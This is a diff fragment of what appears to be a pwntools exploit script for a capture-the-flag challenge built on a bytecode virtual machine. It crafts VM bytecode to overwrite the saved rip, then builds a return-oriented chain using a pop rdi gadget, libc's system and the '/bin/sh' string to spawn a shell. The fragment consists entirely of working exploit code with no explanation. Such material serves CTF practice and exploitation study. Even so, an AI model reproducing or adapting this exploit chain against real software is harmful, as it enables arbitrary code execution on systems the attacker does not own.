@@ -133,16 +133,17 @@ io.sendlineafter("[ lEn? ] >> ", str(len(payload)))
 io.sendlineafter("[ BYTECODE ] >>", payload)
 
 
-# 3. ret->onegadge
+# 3. ret->rop
+
 expend()
 payload = b""
-# 把ret地址写进此vm->rsp， push
+# 把ret地址写进此vm->rsp
 payload += push_reg(5) * 4
 payload += mov_reg(2, 0x7FFFFFFFFFFF)
 payload += push_reg(2)  # rbp
 payload += push_reg(5)  # rsp
 payload += cp_reg(1, 7)
-payload += mov_reg(2, 0x2FB)  # debug nextrip=
+payload += mov_reg(2, 0x2FB)  # debug 
 payload += add_reg(1, 2)
 payload += push_reg(1)
 payload += mov_reg(1, 0x61)
@@ -151,7 +152,7 @@ payload += push_reg(1)  # 0x61
 payload += mov_reg(3, 0xF6)
 payload += mov_reg(4, 0xFF)
 
-# 此处两个push，是为了改写state->rip
+# 此处两个push，是为了改写state->rip,退出程序
 payload += mov_reg(2, 0x7FFFFFFFFFFF)
 payload += push_reg(2)  # rbp
 payload += push_num(0x61)
@@ -159,7 +160,7 @@ payload += push_num(0x61)
 payload += copy(4, 3, 6 * 8 + 1)
 
 pop_rdi_ret = 0x10194A  #: pop rdi ; ret
-system_addr = libc.sym.system
+system_addr = libc.symbols.get("system")
 binsh_addr = next(libc.search("/bin/sh"))
 ret_addr = 0x0000000000025535
 
